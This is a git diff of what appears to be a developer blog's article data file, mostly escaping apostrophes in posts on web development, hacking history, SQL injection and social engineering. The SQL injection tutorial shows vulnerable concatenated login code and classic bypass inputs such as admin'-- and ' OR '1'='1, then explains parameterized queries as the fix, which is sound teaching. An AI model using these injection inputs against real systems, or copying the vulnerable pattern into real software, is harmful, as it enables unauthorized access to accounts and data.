@@ -347,7 +347,7 @@ finally
       <li>✅ Practice Consistently – Write small programs daily to reinforce syntax and concepts.</li>
       <li>✅ Start with Console Applications – They’re simpler, letting you focus on language fundamentals before moving to web or GUI apps.</li>
       <li>✅ Use Online Resources – Microsoft Docs, Pluralsight, and free tutorials like C# on Microsoft Learn are excellent.</li>
-      <li>✅ Build Small Projects – Create a calculator, to-do list, or weather app to apply what you learn.</li>
+      <li>✅ Build Small Projects – Create a calculator, to-do list, or a weather app to apply what you learn.</li>
       <li>✅ Read Other People’s Code – Open-source C# projects on GitHub can teach you real-world coding practices.</li>
       </ul>
       <h3>Final Thoughts</h3>
@@ -2069,22 +2069,22 @@ print(calculate_factorial(5))  # Now outputs 120</code></pre>
     title: 'Beyond the Hoodies & Headlines: The Deep Dive Truth About Hacking',
     excerpt: 'Hacking. The word conjures images of shadowy figures bathed in the glow of monitors, fingers flying across keyboards, infiltrating government databases or draining bank accounts in seconds. But the reality is far more complex, nuanced, and deeply intertwined with the fabric of our digital world. This isn\'t just about breaking in; it\'s about understanding systems at their most fundamental level.',
     content: `
-      <p>Hacking. The word conjures images of shadowy figures bathed in the glow of monitors, fingers flying across keyboards, infiltrating government databases or draining bank accounts in seconds. But the reality is far more complex, nuanced, and deeply intertwined with the fabric of our digital world. This isn't just about breaking in; it's about understanding systems at their most fundamental level.</p>
+      <p>Hacking. The word conjures images of shadowy figures bathed in the glow of monitors, fingers flying across keyboards, infiltrating government databases or draining bank accounts in seconds. But the reality is far more complex, nuanced, and deeply intertwined with the fabric of our digital world. This isn\'t just about breaking in; it\'s about understanding systems at their most fundamental level.</p>
       <h3>Hacking: Beyond Malice, A State of Mind</h3>
-      <p>At its purest core, hacking is the art and science of understanding systems – technological, social, or procedural – and manipulating them beyond their intended purpose or perceived limitations. It's a mindset characterized by intense curiosity, relentless problem-solving, unconventional thinking, and a drive to explore "what if?"</p>
+      <p>At its purest core, hacking is the art and science of understanding systems – technological, social, or procedural – and manipulating them beyond their intended purpose or perceived limitations. It\'s a mindset characterized by intense curiosity, relentless problem-solving, unconventional thinking, and a drive to explore "what if?"</p>
       <p><strong>The Positive Hacker (White Hat):</strong> Sees a locked door and wonders, "How does this lock work? Are there weaknesses? How can I help the owner make it stronger?" They are security researchers, penetration testers, and bug bounty hunters.</p>
       <p><strong>The Neutral Hacker (Grey Hat):</strong> Might pick the lock out of pure curiosity or to prove it can be done, then maybe tell the owner. Their motivations are often ambiguous.</p>
-      <p><strong>The Malicious Hacker (Black Hat):</strong> Picks the lock to steal what's inside. Their goal is personal gain, disruption, or destruction.</p>
+      <p><strong>The Malicious Hacker (Black Hat):</strong> Picks the lock to steal what\'s inside. Their goal is personal gain, disruption, or destruction.</p>
       <h3>A Brief History: From Phreaks to Nation-States</h3>
-      <p>Hacking didn't start with computers.</p>
+      <p>Hacking didn\'t start with computers.</p>
       <p><strong>Early 20th Century: "Phone Phreaking"</strong> – manipulating analog telephone systems using specific tones (e.g., the legendary "Captain Crunch" whistle) to make free calls. This demonstrated exploiting system design flaws.</p>
       <p><strong>1960s-70s: The MIT Tech Model Railroad Club and early computer labs.</strong> Hacking was about pushing the limits of expensive, shared mainframes – optimizing code, creating pranks, exploring. The term "hacker" was a badge of honor.</p>
-      <p><strong>1980s: Personal computers arrive.</strong> The rise of BBS (Bulletin Board Systems) and hacker groups (like Legion of Doom, Chaos Computer Club). First major worms (Morris Worm, 1988) highlighted the internet's fragility. Media sensationalism begins.</p>
+      <p><strong>1980s: Personal computers arrive.</strong> The rise of BBS (Bulletin Board Systems) and hacker groups (like Legion of Doom, Chaos Computer Club). First major worms (Morris Worm, 1988) highlighted the internet\'s fragility. Media sensationalism begins.</p>
       <p><strong>1990s: The World Wide Web explodes.</strong> Hacking becomes more financially motivated (credit card theft, fraud). High-profile breaches hit companies. Tools become more accessible. The concept of "Cyber Warfare" emerges.</p>
       <p><strong>2000s: Mass malware (worms, viruses),</strong> sophisticated botnets, state-sponsored attacks (Stuxnet), hacktivism (Anonymous, LulzSec), and the rise of the data breach.</p>
       <p><strong>2010s-Present: Ransomware epidemic,</strong> supply chain attacks, critical infrastructure targeting, AI-powered attacks, sophisticated phishing/social engineering, nation-state espionage on an industrial scale. The "attack surface" is global and constantly expanding.</p>
-      <h3>The Hacker's Toolkit: More Than Just Code</h3>
-      <p>Contrary to Hollywood, hacking rarely involves just typing furiously on a keyboard. It's a multi-faceted discipline:</p>
+      <h3>The Hacker\'s Toolkit: More Than Just Code</h3>
+      <p>Contrary to Hollywood, hacking rarely involves just typing furiously on a keyboard. It\'s a multi-faceted discipline:</p>
       <h4>Reconnaissance (Recon): The crucial first step.</h4>
       <p><strong>Passive:</strong> Gathering publicly available info (OSINT - Open Source Intelligence): Social media, company websites, job postings, public databases (WHOIS), leaked data dumps.</p>
       <p><strong>Active:</strong> Probing the target directly (without exploitation): Network scanning (Nmap), vulnerability scanning (Nessus, OpenVAS), identifying services/versions, web application crawling.</p>
@@ -2167,7 +2167,7 @@ print(calculate_factorial(5))  # Now outputs 120</code></pre>
         <li><strong>Web Applications:</strong> SQL Injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), insecure APIs.</li>
         <li><strong>AI-Powered Attacks:</strong> Automating phishing, crafting more convincing deepfakes, evading detection systems.</li>
       </ul>
-      <h3>The Defense: Building the Digital Fortress (But Knowing It's Never Perfect)</h3>
+      <h3>The Defense: Building the Digital Fortress (But Knowing It\'s Never Perfect)</h3>
       <p>Hacking necessitates robust defense:</p>
       <ul>
         <li><strong>Security Awareness Training:</strong> Empowering employees to recognize phishing and social engineering. The human firewall is critical.</li>
@@ -2208,7 +2208,7 @@ print(calculate_factorial(5))  # Now outputs 120</code></pre>
       </ul>
       <h3>Conclusion: An Endless Dance</h3>
       <p>Hacking is not a problem to be solved, but a reality to be managed. It is an endless dance between those who seek to understand and exploit systems and those who strive to defend them. The "hacking mindset" – curiosity, deep understanding, creative problem-solving – is invaluable, whether used to fortify defenses or, unfortunately, to to breach them.</p>
-      <p>Understanding hacking in this extreme detail isn't about enabling malicious acts; it's about demystifying the threat, empowering individuals and organizations to build robust defenses, and fostering a generation of ethical hackers dedicated to securing our increasingly digital world. The glow of the monitor reflects both peril and promise; our collective vigilance and ethical application of knowledge will determine which prevails.</p>
+      <p>Understanding hacking in this extreme detail isn\'t about enabling malicious acts; it\'s about demystifying the threat, empowering individuals and organizations to build robust defenses, and fostering a generation of ethical hackers dedicated to securing our increasingly digital world. The glow of the monitor reflects both peril and promise; our collective vigilance and ethical application of knowledge will determine which prevails.</p>
       <p><strong>Disclaimer:</strong> This blog provides information for educational purposes only to understand cybersecurity threats and defenses. Performing unauthorized hacking activities is illegal and unethical. Always obtain explicit permission before testing any system. Use knowledge responsibly.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
         In lines of code, a silent war,<br/>
@@ -2508,7 +2508,7 @@ print(calculate_factorial(5))  # Now outputs 120</code></pre>
       </ul>
 
       <h3>Conclusion: The Unshakeable Foundation</h3>
-      <p>HTML remains the bedrock of the internet despite advancements in CSS, JavaScript, and frameworks. Its evolution from simple document markup to a rich semantic language reflects the web's growth into an application platform. Mastering HTML isn't just about memorizing tags – it's about understanding content architecture, accessibility, and how humans and machines collaborate to build meaningful digital experiences. As emerging technologies like AR/VR and voice interfaces gain traction, HTML's role as a structured content delivery mechanism will only become more critical. The most sophisticated web applications still render to HTML in the end – because without structure, there is no web.</p>
+      <p>HTML remains the bedrock of the internet despite advancements in CSS, JavaScript, and frameworks. Its evolution from simple document markup to a rich semantic language reflects the web's growth into an application platform. Mastering HTML isn\'t just about memorizing tags – it\'s about understanding content architecture, accessibility, and how humans and machines collaborate to build meaningful digital experiences. As emerging technologies like AR/VR and voice interfaces gain traction, HTML's role as a structured content delivery mechanism will only become more critical. The most sophisticated web applications still render to HTML in the end – because without structure, there is no web.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
         In angle brackets, the web is born,<br/>
         The silent skeleton, since the dawn.
@@ -3002,7 +3002,7 @@ This guide covers 100% of HTML5 tags with practical implementation details. Book
     title: 'AI Tools Every Developer Should Know: Supercharge Your Workflow with Smart Solutions',
     excerpt: 'Artificial Intelligence (AI) is revolutionizing software development, automating tedious tasks, enhancing productivity, and unlocking new creative possibilities. For developers, integrating AI tools into your workflow isn\'t just a trend—it\'s a strategic advantage.',
     content: `
-      <p>Artificial Intelligence (AI) is revolutionizing software development, automating tedious tasks, enhancing productivity, and unlocking new creative possibilities. For developers, integrating AI tools into your workflow isn't just a trend—it's a strategic advantage. In this guide, we’ll explore essential AI tools every developer should know, plus highlight tools.huzi.pk—a treasure trove of free utilities, including cutting-edge AI tools, to streamline your projects.</p>
+      <p>Artificial Intelligence (AI) is revolutionizing software development, automating tedious tasks, enhancing productivity, and unlocking new creative possibilities. For developers, integrating AI tools into your workflow isn\'t just a trend—it\'s a strategic advantage. In this guide, we’ll explore essential AI tools every developer should know, plus highlight tools.huzi.pk—a treasure trove of free utilities, including cutting-edge AI tools, to streamline your projects.</p>
       <h3>🚀 Why AI Tools Matter for Developers</h3>
       <p>AI tools help developers:</p>
       <ul>
@@ -3621,7 +3621,7 @@ DLROW</code></pre>
         To build your best, and ace the test.
       </div>
     `,
-    imageUrl: 'https://i.postimg.cc/k4jWfV7d/The-Complete-Encyclopedia-of-Tools-huzi-pk-50-Tools-Demystified.webp',
+    imageUrl: 'https://i.postimg.cc/QCbTSw3f/tools-website.webp',
     imageHint: 'developer tools encyclopedia',
     author: 'Huzi',
     category: 'AI',
@@ -3634,7 +3634,7 @@ DLROW</code></pre>
     content: `
       <h2>The Ultimate Beginner’s Guide to Building a Website with Cloudflare Pages: From Zero to Live in 30 Minutes</h2>
       <h3>Why Cloudflare Pages is Revolutionizing Web Development</h3>
-      <p>Cloudflare Pages isn't just another hosting service – it's a <strong>JAMstack powerhouse</strong> that combines Git-based workflows, serverless functions, and enterprise-grade infrastructure. With automatic SSL, global CDN distribution across 300+ cities, and unlimited free collaborators, it eliminates traditional deployment headaches.</p>
+      <p>Cloudflare Pages isn\'t just another hosting service – it\'s a <strong>JAMstack powerhouse</strong> that combines Git-based workflows, serverless functions, and enterprise-grade infrastructure. With automatic SSL, global CDN distribution across 300+ cities, and unlimited free collaborators, it eliminates traditional deployment headaches.</p>
       <p><strong>Real impact:</strong></p>
       <ul>
         <li>🚀 <em>Tamborazo El Ranchito</em> reduced page load times by 68% after migrating from Wix.</li>
@@ -3928,7 +3928,7 @@ export async function onRequest({ request, next }) {
     title: '10 JavaScript Tricks That Will Save You Hours of Coding Headaches',
     excerpt: 'JavaScript is full of hidden gems that can transform verbose code into elegant solutions. After years of working with JS across production applications, I\'ve curated these battle-tested tricks that consistently save development time. Master these and you\'ll write cleaner, more efficient code immediately.',
     content: `
-      <p>JavaScript is full of hidden gems that can transform verbose code into elegant solutions. After years of working with JS across production applications, I've curated these battle-tested tricks that consistently save development time. Master these and you\'ll write cleaner, more efficient code immediately.</p>
+      <p>JavaScript is full of hidden gems that can transform verbose code into elegant solutions. After years of working with JS across production applications, I\'ve curated these battle-tested tricks that consistently save development time. Master these and you\'ll write cleaner, more efficient code immediately.</p>
       
       <h3>1. Destructuring with Aliases & Default Values</h3>
       <p><strong>The Problem:</strong> Nested object properties require repetitive null checks.</p>
@@ -4277,7 +4277,7 @@ rclone sync /mnt/backup b2:wp-backups</code></pre>
         <li>Ransom notes (e.g., a readme.txt in the root directory)</li>
         <li>Unusual admin users (check the wp_users table)</li>
       </ul>
-      <blockquote><p>"WordPress security isn't about perfection - it's about making attackers move to easier targets. Implement these layers, and you'll be in the top 0.1% of secured sites." - Mikhail, Former WordPress Security Lead at Sucuri</p></blockquote>
+      <blockquote><p>"WordPress security isn\'t about perfection - it\'s about making attackers move to easier targets. Implement these layers, and you\'ll be in the top 0.1% of secured sites." - Mikhail, Former WordPress Security Lead at Sucuri</p></blockquote>
       <h3>Immediate Action Plan</h3>
       <ol>
         <li>Harden wp-config.php.</li>
@@ -4301,7 +4301,7 @@ rclone sync /mnt/backup b2:wp-backups</code></pre>
     title: 'The Static Renaissance: How Pre-Rendered Websites Are Revolutionizing the Modern Web',
     excerpt: 'Discover why static websites are making a dramatic comeback, offering unparalleled speed, security, and scalability for the modern web. Learn how technologies like JAMstack and SSGs are transforming digital experiences.',
     content: `
-      <p>Imagine this: You click a link and the website loads instantly—no skeleton loaders, no lag, no spinning wheels. This isn't magic; it's the reality of next-generation static websites. Once dismissed as relics of the early web, static architecture is experiencing a dramatic resurgence. By 2025, a significant portion of new sites leverage static generation for core pages—from Fortune 500 marketing sites to developer portfolios like tools.huzi.pk. Here’s why the static web is back—and why it’s dominating modern digital experiences.</p>
+      <p>Imagine this: You click a link and the website loads instantly—no skeleton loaders, no lag, no spinning wheels. This isn\'t magic; it\'s the reality of next-generation static websites. Once dismissed as relics of the early web, static architecture is experiencing a dramatic resurgence. By 2025, a significant portion of new sites leverage static generation for core pages—from Fortune 500 marketing sites to developer portfolios like tools.huzi.pk. Here’s why the static web is back—and why it’s dominating modern digital experiences.</p>
       
       <h3>From Geocities to JAMstack: The Evolution of "Static"</h3>
       <p>The static websites of 2005 were indeed primitive: hand-coded HTML files, manual updates, and zero interactivity. Today’s static sites are engineered powerhouses built with a modern toolchain:</p>
@@ -4372,15 +4372,15 @@ git push origin main
       </ul>
       
       <h3>When Static Hits Its Limits (And How to Overcome Them)</h3>
-      <p>Static architecture isn't a silver bullet for every use case, but hybrid patterns can bridge the gaps:</p>
+      <p>Static architecture isn\'t a silver bullet for every use case, but hybrid patterns can bridge the gaps:</p>
       <ul>
-        <li><strong>User Accounts:</strong> Purely static sites can't manage user sessions. The modern solution is to use a third-party service like Auth0 or Clerk, handling authentication via client-side JavaScript and serverless functions.</li>
+        <li><strong>User Accounts:</strong> Purely static sites can\'t manage user sessions. The modern solution is to use a third-party service like Auth0 or Clerk, handling authentication via client-side JavaScript and serverless functions.</li>
         <li><strong>Real-Time Updates:</strong> For live data (like chat or notifications), a static site can open a WebSocket connection to a dedicated real-time service.</li>
         <li><strong>Frequent Content Edits:</strong> If a site requires constant updates, a full rebuild for every change is inefficient. <strong>Incremental Static Regeneration (ISR)</strong>, popularized by Next.js, allows individual pages to be re-rendered on a schedule or on-demand without rebuilding the entire site.</li>
-        <li><strong>Complex Forms:</strong> Static sites can't process form data. The solution is to submit the form to a serverless function or a third-party service like Formspree or Netlify Forms.</li>
+        <li><strong>Complex Forms:</strong> Static sites can\'t process form data. The solution is to submit the form to a serverless function or a third-party service like Formspree or Netlify Forms.</li>
       </ul>
       
-      <h3>The \'\'\'tools.huzi.pk\'\'\' Blueprint: A Modern Static Stack</h3>
+      <h3>The tools.huzi.pk Blueprint: A Modern Static Stack</h3>
       <p>This developer tools site exemplifies modern static best practices:</p>
       <ul>
         <li><strong>SSG:</strong> Astro, for its excellent performance and support for partial hydration.</li>
@@ -4421,7 +4421,7 @@ npx wrangler pages publish ./dist --project-name my-static-site</code></pre>
       </ol>
       
       <h3>The Future is Hybrid</h3>
-      <p>The next evolution of static isn't about eliminating dynamic functionality but about being smarter with pre-rendering and pushing logic to the edge:</p>
+      <p>The next evolution of static isn\'t about eliminating dynamic functionality but about being smarter with pre-rendering and pushing logic to the edge:</p>
       <ul>
         <li><strong>Edge Functions:</strong> Running lightweight JavaScript on CDN nodes (like Cloudflare Workers) allows for dynamic logic (like A/B testing or authentication) without a round trip to an origin server.</li>
         <li><strong>Incremental Static Regeneration (ISR):</strong> A feature in frameworks like Next.js that allows static pages to be re-rendered automatically after a certain interval or on-demand, combining the speed of static with the freshness of dynamic.</li>
@@ -4438,7 +4438,7 @@ npx wrangler pages publish ./dist --project-name my-static-site</code></pre>
         <li><strong>Immense Security:</strong> A 99% reduction in common attack vectors.</li>
         <li><strong>Superior Performance:</strong> Near-perfect Core Web Vitals scores.</li>
       </ul>
-      <p>Sites like \'\'\'tools.huzi.pk\'\'\' prove that "static" no longer means simplistic. By leveraging the modern JAMstack, developers can build applications that are secure without being rigid, fast without being fragile, and scalable without being complex. The renaissance is here, and it's built on a foundation of pre-rendered perfection.</p>
+      <p>Sites like 'tools.huzi.pk' prove that "static" no longer means simplistic. By leveraging the modern JAMstack, developers can build applications that are secure without being rigid, fast without being fragile, and scalable without being complex. The renaissance is here, and it's built on a foundation of pre-rendered perfection.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
         The server sleeps, the files reside,<br/>
         On edges fast, where worlds collide.
@@ -4501,7 +4501,7 @@ npx wrangler pages publish ./dist --project-name my-static-site</code></pre>
       </ul>
 
       <h3>Chapter 2: CSS Grid - The Master of Two-Dimensional Layouts</h3>
-      <p>CSS Grid Layout is designed for two-dimensional layouts, allowing you to control both rows and columns simultaneously. It's the most powerful layout system CSS has ever had.</p>
+      <p>CSS Grid Layout is designed for two-dimensional layouts, allowing you to control both rows and columns simultaneously. It\'s the most powerful layout system CSS has ever had.</p>
 
       <h4>Core Concepts of Grid</h4>
       <ul>
@@ -4548,7 +4548,7 @@ npx wrangler pages publish ./dist --project-name my-static-site</code></pre>
       </ul>
 
       <h3>Chapter 3: Flexbox vs. Grid - The Great Debate (and Why It's Wrong)</h3>
-      <p>The question isn't "Flexbox OR Grid?" but "Flexbox AND Grid?". They are designed to work together.</p>
+      <p>The question isn\'t "Flexbox OR Grid?" but "Flexbox AND Grid?". They are designed to work together.</p>
       
       <table>
         <thead>
@@ -4789,11 +4789,11 @@ Promise.race([promise1, promise2]).then(value => {
 
       <h3>Conclusion: Best Practices for Async/Await</h3>
       <ol>
-        <li><strong>Always use <code>try...catch</code></strong> for error handling in async functions. Don't let a rejected promise go unhandled.</li>
+        <li><strong>Always use <code>try...catch</code></strong> for error handling in async functions. Don\'t let a rejected promise go unhandled.</li>
         <li><strong>Don't mix styles.</strong> Avoid mixing <code>.then()</code> chains with async/await within the same logical block if it harms readability.</li>
-        <li><strong>Use <code>Promise.all()</code> for concurrency.</strong> Don't await multiple independent promises in sequence; run them in parallel.</li>
+        <li><strong>Use <code>Promise.all()</code> for concurrency.</strong> Don\'t await multiple independent promises in sequence; run them in parallel.</li>
         <li><strong>Remember <code>await</code> only works in <code>async</code> functions.</strong> This is a common beginner mistake.</li>
-        <li><strong>Favor async/await</strong> for cleaner, more maintainable code, but understand that under the hood, it's still just Promises.</li>
+        <li><strong>Favor async/await</strong> for cleaner, more maintainable code, but understand that under the hood, it\'s still just Promises.</li>
       </ol>
       <p>Mastering async/await is a critical skill for any modern JavaScript developer. It simplifies complex asynchronous logic, reduces bugs, and makes your code a joy to read and maintain.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
@@ -4879,7 +4879,7 @@ app.use(express.json()); // Middleware to parse JSON bodies
 app.use('/api/items', itemRoutes); // Mount the router
 
 // ... (app.listen)</code></pre>
-      <p>Now, if you restart the server and go to <code>http://localhost:3000/api/items</code>, you'll see your items array as JSON.</p>
+      <p>Now, if you restart the server and go to <code>http://localhost:3000/api/items</code>, you\'ll see your items array as JSON.</p>
 
       <h3>Chapter 3: Implementing CRUD Operations</h3>
       <p>CRUD stands for Create, Read, Update, Delete. These are the fundamental operations of any REST API.</p>
@@ -4916,7 +4916,7 @@ router.post('/', itemController.createItem);
 module.exports = router;</code></pre>
 
       <h4>3.3 The Full CRUD API</h4>
-      <p>Here's what your final <code>routes/items.js</code> might look like:</p>
+      <p>Here\'s what your final <code>routes/items.js</code> might look like:</p>
       <table>
         <thead>
           <tr>
@@ -4955,7 +4955,7 @@ module.exports = router;</code></pre>
       </table>
 
       <h3>Chapter 4: Connecting to a Database (MongoDB)</h3>
-      <p>Let's replace our in-memory array with a real database. We'll use MongoDB with Mongoose, an Object Data Modeling (ODM) library.</p>
+      <p>Let\'s replace our in-memory array with a real database. We\'ll use MongoDB with Mongoose, an Object Data Modeling (ODM) library.</p>
       
       <h4>4.1 Installation</h4>
       <pre><code class="language-bash">npm install mongoose dotenv</code></pre>
@@ -5023,14 +5023,14 @@ exports.createItem = async (req, res) => {
 });</code></pre>
 
       <h3>Conclusion: Your Path Forward</h3>
-      <p>You've now built the foundation of a scalable REST API with Node.js and Express. From here, you can explore more advanced topics:</p>
+      <p>You\'ve now built the foundation of a scalable REST API with Node.js and Express. From here, you can explore more advanced topics:</p>
       <ul>
         <li><strong>Authentication and Authorization:</strong> Using JWT (JSON Web Tokens) with libraries like Passport.js.</li>
         <li><strong>Validation:</strong> Using libraries like Joi or express-validator to validate incoming data.</li>
         <li><strong>Testing:</strong> Writing unit and integration tests with frameworks like Jest and Supertest.</li>
         <li><strong>Deployment:</strong> Deploying your API to platforms like Heroku, AWS, or DigitalOcean.</li>
       </ul>
-      <p>The principles you've learned here—structuring your app, handling requests, and interacting with a database—are the fundamental building blocks for almost any backend service you'll create.</p>
+      <p>The principles you\'ve learned here—structuring your app, handling requests, and interacting with a database—are the fundamental building blocks for almost any backend service you\'ll create.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
         A request arrives, a route takes flight,<br/>
         In Node's domain, all logic's right.
@@ -5049,11 +5049,11 @@ exports.createItem = async (req, res) => {
     content: `
       <h2>Introduction: The Persistent Threat</h2>
       <p>SQL Injection (SQLi) is a code injection technique used to attack data-driven applications. It occurs when malicious SQL statements are inserted into an entry field for execution (e.g., to dump the database contents to the attacker). Despite being one of the oldest and most well-known web vulnerabilities, the OWASP Top 10 consistently lists it as a critical threat.</p>
-      <p>Understanding and preventing SQLi is not optional—it's a fundamental requirement for any developer working with databases.</p>
+      <p>Understanding and preventing SQLi is not optional—it\'s a fundamental requirement for any developer working with databases.</p>
 
       <h3>Chapter 1: Anatomy of a SQL Injection Attack</h3>
-      <p>Let's consider a simple, vulnerable login query.</p>
-      <p><strong>The Vulnerable Code (Node.js example):</strong></p>
+      <p>Let\'s consider a simple, vulnerable login query.</p>
+      <p><strong>The Vulnerable Code (Node.js with \`mysql\` package):</strong></p>
       <pre><code class="language-javascript">const username = req.body.username; // User input: 'admin'
 const password = req.body.password; // User input: 'password123'
 
@@ -5065,10 +5065,10 @@ db.query(query, (err, results) => {
       <p>This code directly concatenates user input into the SQL string. This is the root cause of SQLi.</p>
 
       <h4>The Classic Attack: Authentication Bypass</h4>
-      <p>An attacker doesn't need to know the password. They can inject SQL code to change the logic of the query.</p>
+      <p>An attacker doesn\'t need to know the password. They can inject SQL code to change the logic of the query.</p>
       <ul>
-        <li><strong>Attacker's Username Input:</strong> <code>admin'--</code></li>
-        <li><strong>Attacker's Password Input:</strong> (anything, it doesn't matter)</li>
+        <li><strong>Attacker\'s Username Input:</strong> <code>admin'--</code></li>
+        <li><strong>Attacker\'s Password Input:</strong> (anything, it doesn\'t matter)</li>
       </ul>
       <p>The resulting SQL query becomes:</p>
       <pre><code class="language-sql">SELECT * FROM users WHERE username = 'admin'--' AND password = '...';</code></pre>
@@ -5076,7 +5076,7 @@ db.query(query, (err, results) => {
       
       <h4>Another Common Attack: <code>' OR '1'='1</code></h4>
       <ul>
-        <li><strong>Attacker's Username Input:</strong> <code>' OR '1'='1</code></li>
+        <li><strong>Attacker\'s Username Input:</strong> <code>' OR '1'='1</code></li>
       </ul>
       <p>The query becomes:</p>
       <pre><code class="language-sql">SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...';</code></pre>
@@ -5093,7 +5093,7 @@ db.query(query, (err, results) => {
       </ul>
 
       <h4>Inferential SQLi (Blind SQLi)</h4>
-      <p>This is used when the web application doesn't return the results of the malicious query directly in its response. The attacker has to reconstruct the data piece by piece.</p>
+      <p>This is used when the web application doesn\'t return the results of the malicious query directly in its response. The attacker has to reconstruct the data piece by piece.</p>
       <ul>
         <li><strong>Boolean-Based Blind SQLi:</strong> The attacker sends a SQL query that forces the application to return a different result depending on whether the query returns true or false.</li>
         <li><strong>Time-Based Blind SQLi:</strong> The attacker sends a SQL query that forces the database to wait for a specified amount of time (e.g., using <code>SLEEP(5)</code>) before responding. The response time indicates whether the query was true or false.</li>
@@ -5128,10 +5128,10 @@ const user = await User.findOne({ where: { username: userInput } });</code></pre
       <p>Ensure that the database user account your application connects with has only the minimum permissions it needs. For example, a user account for a public-facing website should not have permissions to <code>DROP TABLE</code>.</p>
 
       <h4>3. Input Validation and Sanitization</h4>
-      <p>Always validate user input on the server side to ensure it's in the expected format (e.g., a username should only contain certain characters, an email must be a valid email format). While this is not a substitute for parameterized queries, it's a good secondary defense.</p>
+      <p>Always validate user input on the server side to ensure it's in the expected format (e.g., a username should only contain certain characters, an email must be a valid email format). While this is not a substitute for parameterized queries, it\'s a good secondary defense.</p>
       
       <h4>4. Web Application Firewall (WAF)</h4>
-      <p>A WAF (like Cloudflare's or AWS WAF) can detect and block common SQLi patterns at the network edge before they even reach your application. This is a great first line of defense but should not be relied upon as your only protection.</p>
+      <p>A WAF (like Cloudflare\'s or AWS WAF) can detect and block common SQLi patterns at the network edge before they even reach your application. This is a great first line of defense but should not be relied upon as your only protection.</p>
 
       <h3>Conclusion: A Solved Problem</h3>
       <p>SQL Injection is a powerful attack, but it is a **100% solvable problem**. Unlike other complex vulnerabilities, the solution is clear, universal, and highly effective.</p>
@@ -5161,7 +5161,7 @@ const user = await User.findOne({ where: { username: userInput } });</code></pre
     content: `
       <h2>Introduction: The Weakest Link</h2>
       <p>You can have the most advanced firewalls, the strongest encryption, and the latest intrusion detection systems, but none of it matters if an attacker can simply trick an employee into handing over the keys to the kingdom. This is the world of <strong>social engineering</strong>—the art of manipulating people into performing actions or divulging confidential information.</p>
-      <p>This is not a technical hack; it's a psychological one. And it's responsible for over 90% of successful cyber attacks.</p>
+      <p>This is not a technical hack; it\'s a psychological one. And it\'s responsible for over 90% of successful cyber attacks.</p>
 
       <h3>Chapter 1: The Psychology of Deception</h3>
       <p>Social engineering works by exploiting fundamental human cognitive biases and tendencies. Attackers leverage these psychological principles to build trust and create a sense of urgency or authority.</p>
@@ -5176,12 +5176,12 @@ const user = await User.findOne({ where: { username: userInput } });</code></pre
         <li><strong>Scarcity:</strong> Perceived scarcity will generate demand. (e.g., "This offer is only valid for the next 10 minutes! Click here to claim your bonus!").</li>
       </ol>
 
-      <h3>Chapter 2: The Social Engineer's Toolkit - Common Attack Vectors</h3>
+      <h3>Chapter 2: The Social Engineer\'s Toolkit - Common Attack Vectors</h3>
       
       <h4>Phishing</h4>
       <p>The most common form of social engineering. Fraudulent emails are sent that appear to be from a reputable source to induce individuals to reveal personal information, such as passwords and credit card numbers.</p>
       <ul>
-        <li><strong>Spear Phishing:</strong> Targets a specific individual or organization. The email is highly personalized, using the target's name, position, or other known information.</li>
+        <li><strong>Spear Phishing:</strong> Targets a specific individual or organization. The email is highly personalized, using the target\'s name, position, or other known information.</li>
         <li><strong>Whaling:</strong> A type of spear phishing aimed at senior executives or other high-profile targets.</li>
         <li><strong>Smishing:</strong> Phishing conducted via SMS text messages.</li>
         <li><strong>Vishing:</strong> Phishing conducted over the phone (voice phishing).</li>
@@ -5196,7 +5196,7 @@ const user = await User.findOne({ where: { username: userInput } });</code></pre
       </blockquote>
 
       <h4>Pretexting</h4>
-      <p>This is the act of creating and using an invented scenario (the pretext) to engage a targeted victim in a way that increases the chance the victim will divulge information or perform actions that would be unlikely in ordinary circumstances. For example, an attacker might pretend to be from IT support and claim they need the user's password to fix a problem.</p>
+      <p>This is the act of creating and using an invented scenario (the pretext) to engage a targeted victim in a way that increases the chance the victim will divulge information or perform actions that would be unlikely in ordinary circumstances. For example, an attacker might pretend to be from IT support and claim they need the user\'s password to fix a problem.</p>
 
       <h4>Baiting</h4>
       <p>Baiting is like a real-world Trojan horse. The attacker leaves a malware-infected physical device, such as a USB flash drive, in a location where it is sure to be found (e.g., a company lobby or bathroom). The drive is labeled with something enticing like "2024 Salaries" or "Confidential". When the curious employee plugs the drive into their computer, malware is installed.</p>
@@ -5212,7 +5212,7 @@ const user = await User.findOne({ where: { username: userInput } });</code></pre
       <ul>
         <li><strong>Simulated Phishing Campaigns:</strong> Regularly send safe, simulated phishing emails to employees. Those who click the link receive immediate, on-the-spot training about the red flags they missed.</li>
         <li><strong>Gamification:</strong> Create leaderboards or rewards for employees who report phishing attempts successfully.</li>
-        <li><strong>Focus on "Why":</strong> Don't just teach the rules. Explain the real-world consequences of a breach to create a sense of shared responsibility.</li>
+        <li><strong>Focus on "Why":</strong> Don\'t just teach the rules. Explain the real-world consequences of a breach to create a sense of shared responsibility.</li>
       </ul>
 
       <h4>2. Establish Clear Policies and Procedures</h4>
@@ -5223,7 +5223,7 @@ const user = await User.findOne({ where: { username: userInput } });</code></pre
       </ul>
 
       <h4>3. Implement Technical Safeguards</h4>
-      <p>While technology isn't a silver bullet, it provides crucial safety nets.</p>
+      <p>While technology isn\'t a silver bullet, it provides crucial safety nets.</p>
       <ul>
         <li><strong>Advanced Email Filtering:</strong> Use email security gateways that can detect spoofed domains, malicious links, and suspicious attachments.</li>
         <li><strong>Multi-Factor Authentication (MFA):</strong> This is one of the most effective controls. Even if an attacker steals a password, they cannot log in without the second factor.</li>
@@ -5232,7 +5232,7 @@ const user = await User.findOne({ where: { username: userInput } });</code></pre
 
       <h3>Conclusion: Security is a Culture, Not a Product</h3>
       <p>Social engineering preys on our very nature to be helpful and trusting. The only way to combat it effectively is to build a culture of security where every employee feels empowered to be skeptical, to question requests, and to verify information before acting.</p>
-      <p>Remember the golden rule of social engineering defense: <strong>Trust, but verify.</strong> A polite "Let me call you back on your official number to confirm" or "I'm going to verify this request with my manager first" is not an insult—it's the sign of a strong human firewall.</p>
